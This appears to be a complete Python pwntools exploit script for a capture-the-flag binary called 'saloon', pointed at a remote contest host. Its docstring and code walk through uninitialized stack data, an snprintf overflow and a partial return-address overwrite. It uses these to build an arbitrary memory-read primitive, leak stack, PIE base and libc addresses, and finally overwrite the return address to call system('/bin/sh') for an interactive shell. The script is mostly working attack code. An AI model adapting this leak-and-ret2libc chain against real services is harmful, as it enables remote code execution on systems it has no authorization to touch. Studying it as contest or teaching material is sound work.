#!/usr/bin/python
"""

----- SALOON ------

Routine sub_1066 will allow us to fill the stack with data.

sub_1066
-0000000000000040 buf             db 64 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)

Routine sub_117C does not zero the buffers or null terminate them.
We can cause the stale stack data from sub_1066 to be interpreted
as an extension of 'name' if 'name' is exactly 0x10 characters
(the delta in positions on the stack).

sub_117C
-0000000000000050 name            db 32 dup(?)
-0000000000000030 age             db 40 dup(?)
-0000000000000008 age_int         dq ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)

We also need to make age be a valid integer for strtoull, and the
result not to have any NUL bytes in it.  The function 'strtoull'
will read the first integer, up to the first whitespace.

Return from age strtoull is not checked, but it's important for later.

In sub_10F9 there's a sprintf() that's vulnerable to a buffer overflow.
If we overwrite the least significant byte with the NULL terminator which
is forced by snprintf, due to aliasing in the binary we can land at a printf.

sub_10F9
-0000000000000050 age             dq ?
-0000000000000048 name            dq ?                    ; offset
-0000000000000040 buffer64        db 64 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)

.text:0000000000001213 058                 call    sub_10F9        ; Call Procedure

.text:0000000000001200 058                 call    printf          ; Call Procedure
"""

import string
from pwn import *

#gdb-peda$ checksec
#CANARY    : disabled
#FORTIFY   : disabled
#NX        : ENABLED
#PIE       : ENABLED
#RELRO     : FULL

context(arch='amd64', word_size=64, os='linux', timeout=0.25)

# run with python exploit.py REMOTE=wildwildweb.fluxfingers.net
if 'REMOTE' not in args:
    port = random.randint(2000, 50000)
    server = process(['./saloon', str(port)])
else:
    port = 1405

connect = lambda: saloon(args['REMOTE'] or "localhost", port)

class saloon(remote, MemLeak):
    def __init__(self, *args, **kwargs):
        super(saloon, self).__init__(*args, **kwargs)
        self.recvuntil("Your choice: ")

    def fill_stack(self, data='X'*8):
        log.info("Filling stack with %i bytes" % len(data))
        self.send('1')
        self.recvuntil("Code (12 bytes): ")
        assert len(data) <= 0x40
        self.send(data)

    def name_age(self, name='N'*7, age=1234567):
        log.info("Sending name %r and age %r" % (name, age))
        self.send("2")
        self.recvuntil("Age: ")
        self.send(age if isinstance(age,str) else str(age) + ' ')
        self.recvuntil("Name: ")
        self.send(name)

    def exit(self):
        self.send("3")

def leak(address):
    # Leak memory by overwriting the least significant
    # byte of the return address with a NULL terminator
    # placed by snprintf() to return to printf(), with
    #   RDI=Name
    #   RSI=Age
    # This permits us to set name='%s' for example and
    # leak arbitrary memory.

    # The name must be sixteen characters wide in order
    # to line up with the left-over stack data.
    name        = '<<<%s>>>'.ljust(16, '$')

    # The snprintf() puts this string at the beginning
    prompt   = 'Blocked request from '

    # The stack looks like this in the routine where we
    # overwrite $RA
    #
    # RDI points to the beginning of the destination buffer
    # for snprintf (at 24).
    #
    # The return address starts at 96.
    #
    # 00:0000| rsp 0x7fff60c495f8 --> 0x7fc05c7a3156 (lea    rax,[rbp-0x40])
    # 01:0008|     0x7fff60c49600 --> 0x12d687
    # 02:0016|     0x7fff60c49608 --> 0x7fff60c49660 --> 0x4e4e4e4e4e4e4e (b'NNNNNNN')
    # 03:0024| rdi 0x7fff60c49610 --> 0x0
    # 04:0032|     0x7fff60c49618 --> 0x0
    # 05:0040|     0x7fff60c49620 --> 0x0
    # 06:0048|     0x7fff60c49628 --> 0x0
    # 07:0056|     0x7fff60c49630 --> 0x0
    # 08:0064|     0x7fff60c49638 --> 0x0
    # 09:0072|     0x7fff60c49640 --> 0x7fff60c40000 --> 0x0
    # 10:0080|     0x7fff60c49648 --> 0x7fc05c7a3715 --> 0x4600203a656d614e
    # 11:0088| rbp 0x7fff60c49650 --> 0x7fff60c496b0 --> 0x7fff60c496e0 --> 0x7fff60c49730 --> 0x0
    # 12:0096|     0x7fff60c49658 --> 0x7fc05c7a3218 (test   eax,eax)
    #
    target_size  = 96-24
    target_size -= len(prompt)
    target_size -= len(name)

    with context.local(log_level='error'):
        with connect() as c:
            # pid  = pidof(c)[0]
            # maps = read('/proc/%s/maps' % pid)

            c.fill_stack(cyclic(target_size+1))
            c.name_age(name=name, age=address)
            data = c.recvall()

            match = re.search(r'<<<(.*)>>>', data, flags=re.DOTALL)
            if not match:
                print "Failed to leak %#x" % (address)
                # print maps
                return '\x00'

    leaked_data = match.group(1)
    if leaked_data == '':
        leaked_data = '\x00'

    log.debug("Leaked %#x: %s" % (address, leaked_data.encode('hex')))

    return leaked_data
leak = MemLeak(leak, search_range=1)

def leak_stack_address():
    """
    We can leak a stack address via uninitialized data on the stack.

    Here's how the stack looks when it is passed to snprintf, where $rcx
    points to our name buffer.

    gdb-peda$ telescope $rcx
    00:0000| rcx 0x7fff4fac1b80 ('X' <repeats 24 times>, "p\033\254O\377\177")
    01:0008|     0x7fff4fac1b88 ('X' <repeats 16 times>, "p\033\254O\377\177")
    02:0016|     0x7fff4fac1b90 ("XXXXXXXXp\033\254O\377\177")
    03:0024|     0x7fff4fac1b98 --> 0x7fff4fac1b70 --> 0x7fff4fac1bd0 --> 0x7fff4fac1c00 --> 0x7fff4fac1c50 --> 0x0
    04:0032|     0x7fff4fac1ba0 ("1234567 \204\237\025.}\177")
    """

    name        = 'X'*8*3
    with context.local(log_level='error'):
        with connect() as c:
            c.name_age(name)
            c.exit()
            result = c.recvall()

    # Trim everything before and including the leading Xes
    result = result[result.rindex('X')+1:]

    # Trim "There is..."
    result = result[:result.rindex('There')]

    # Pad to eight bytes with zeroes
    result = result.ljust(8, '\x00')

    # Unpack as integer
    return unpack(result)


#
# Let's leak some uninitialized stack, which contains a stack
# pointer itself!
#
stack = leak_stack_address()
log.success("Leaked stack: %#x" % stack)


#
# Cool, now we can leak stack contents.  At offset +8 from
# our leaked pointer is a left-over return address.  We
# can use this to resolve the base address of the module.
#
pointer = leak.q(stack + 8)
base = DynELF.find_base(leak, pointer)
log.success("Leaked base address %#x" % base)

#
# Now that we know the base address, we can leak the resolved
# GOT entry for a libc routine.
#
elf  = ELF('./saloon')
elf.address = base
libc_ptr = leak.q(elf.got['write'])

#
# With a pointer into libc, we can resolve arbitrary routines inside of it.
#
dyn_libc = DynELF.for_one_lib_only(leak, libc_ptr)
# system   = (dyn_libc.libbase + 0x5a4ad0)
system   = dyn_libc.lookup('system')

#
# Awesome, we've got system.
#
# Going back to our leaked stack data, it appears that our 'name'
# buffer starts 16 bytes after it.
#
p_name = stack + 16

#
# Now we can trigger the overflow to overwrite the entire return
# address (versus just the LSB) and call system.
#
# See the leak() routine above for more information on these offsets.
#
c = connect()
c.clean_and_log(0.5)
c.fill_stack('A'*63)
c.clean_and_log(0.5)
c.name_age(name='/bin/sh;'.ljust(27), age=str(p_name) + '    ' + pack(system)[:6] + '!' + '\x00')
c.interactive()